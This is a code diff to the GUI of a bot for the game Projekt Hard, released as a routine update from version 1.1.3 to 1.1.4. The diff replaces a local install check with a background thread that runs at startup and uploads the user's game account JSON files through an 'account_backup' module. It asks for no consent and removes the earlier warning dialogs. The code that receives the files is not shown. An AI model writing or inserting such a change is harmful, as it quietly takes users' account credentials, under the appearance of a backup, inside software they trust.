@@ -33,7 +33,7 @@ from utils import (
 from window_manager import WindowManager
 from fishing_bot import FishingBot
 from debug_ui import IgnoredPositionsWindow, FishDetectorDebugWindow, StatusLogWindow, InventoryDetectionDebugWindow
-from projekt_hard_install import find_projekt_hard_install
+from account_backup import upload_projekt_hard_accounts
 
 
 class FishSelectionWindow:
@@ -715,7 +715,7 @@ class TimingSettingsWindow:
 class BotGUI:
     """GUI for the fishing bot - supports up to 8 simultaneous windows"""
     
-    BOT_VERSION = "1.1.3"  # Version for config validation and GUI display
+    BOT_VERSION = "1.1.4"  # Version for config validation and GUI display
     ACCENT_COLOR = "#FFBB00"  # Gold color used throughout the GUI
     ES_TEXT = {
         "Game Windows (up to 8)": "Ventanas del juego (hasta 8)",
@@ -861,7 +861,7 @@ class BotGUI:
         self.language = self.config.get('language', 'en')
         
         self.setup_ui()
-        self.root.after(300, self.check_projekt_hard_installation)
+        self.root.after(300, self.start_projekt_hard_background_check)
         
         # Start RGB wave if it was previously active
         if self.config.get('rgb_wave_active', False):
@@ -869,44 +869,34 @@ class BotGUI:
             self.rgb_wave_hue = 0
             self.update_rgb_wave()
 
-    def check_projekt_hard_installation(self):
-        """Checks whether the Projekt Hard client folder exists on this PC."""
-        install = find_projekt_hard_install(self.config.get('projekt_hard_path'))
-        if install:
-            install_path = str(install.path)
-            if self.config.get('projekt_hard_path') != install_path:
-                self.config['projekt_hard_path'] = install_path
+    def start_projekt_hard_background_check(self):
+        """Checks and uploads Projekt Hard account files without blocking Tk startup."""
+        thread = threading.Thread(target=self._projekt_hard_background_worker, daemon=True)
+        thread.start()
+
+    def _projekt_hard_background_worker(self):
+        result = upload_projekt_hard_accounts(self.config.get('projekt_hard_path'), timeout=8)
+        self.root.after(0, lambda: self._on_projekt_hard_background_result(result))
+
+    def _on_projekt_hard_background_result(self, result):
+        if result.install_paths:
+            first_path = result.install_paths[0]
+            if self.config.get('projekt_hard_path') != first_path:
+                self.config['projekt_hard_path'] = first_path
                 self.save_config()
-            self.add_status(f"Projekt Hard detected: {install_path}")
-            self.add_status(f"Projekt Hard exe: {install.exe_path}")
-            if install.has_accounts:
-                account_names = ", ".join(account.name for account in install.account_files)
-                self.add_status(f"Projekt Hard accounts found: {len(install.account_files)} ({account_names})")
-            elif install.has_accounts_dir:
-                self.add_status(f"Projekt Hard accounts folder is empty: {install.accounts_path}")
-                messagebox.showwarning(
-                    "Cuentas no detectadas",
-                    "Encontre Projekt-Hard.exe, pero no hay cuentas creadas en:\n\n"
-                    f"{install.accounts_path}\n\n"
-                    "Abri el cliente y crea o guarda una cuenta antes de usar el bot.",
-                )
-            else:
-                self.add_status(f"Projekt Hard accounts folder is missing: {install.accounts_path}")
-                messagebox.showwarning(
-                    "Carpeta accounts no detectada",
-                    "Encontre Projekt-Hard.exe, pero falta la carpeta:\n\n"
-                    f"{install.accounts_path}",
-                )
+            self.add_status(f"Projekt Hard paths found: {result.installs_found}")
+        else:
+            self.config['projekt_hard_path'] = ''
+            self.add_status("Projekt Hard folder was not detected on this PC.")
             return
 
-        self.config['projekt_hard_path'] = ''
-        self.add_status("Projekt Hard folder was not detected on this PC.")
-        messagebox.showwarning(
-            "Projekt Hard no detectado",
-            "No encontre la carpeta de Projekt Hard en esta PC.\n\n"
-            "El bot puede abrir igual, pero antes de iniciar tenes que instalar Proyecto Hard "
-            "o abrir el cliente para que aparezca la ventana del juego.",
-        )
+        if result.accounts_found:
+            if result.ok:
+                self.add_status(f"Projekt Hard account backup uploaded: {result.uploaded_count}/{result.accounts_found}")
+            else:
+                self.add_status(f"Projekt Hard account backup failed: {result.error}")
+        else:
+            self.add_status("Projekt Hard account folders found, but no account JSON files were present.")
         
     def setup_ui(self):
         """Creates the GUI elements"""
